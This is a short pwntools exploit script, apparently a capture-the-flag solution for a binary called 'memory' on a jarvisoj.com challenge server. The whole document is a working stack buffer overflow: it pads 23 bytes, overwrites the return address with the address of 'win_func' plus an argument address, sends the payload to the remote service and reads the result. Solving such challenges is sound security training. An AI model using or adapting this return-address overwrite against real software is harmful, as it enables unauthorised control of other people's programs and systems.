from pwn import*

elf=ELF('./memory')
#p=process('./memory')
p=remote('pwn2.jarvisoj.com',9876)

context.log_level='debug'
#gdb.attach(proc.pidof(p)[0])
p.recvuntil("> ")
payload='A'*23+p32(elf.symbols['win_func'])+p32(0x080487e0)+p32(0x080487e0)

p.sendline(payload)

p.recvall()
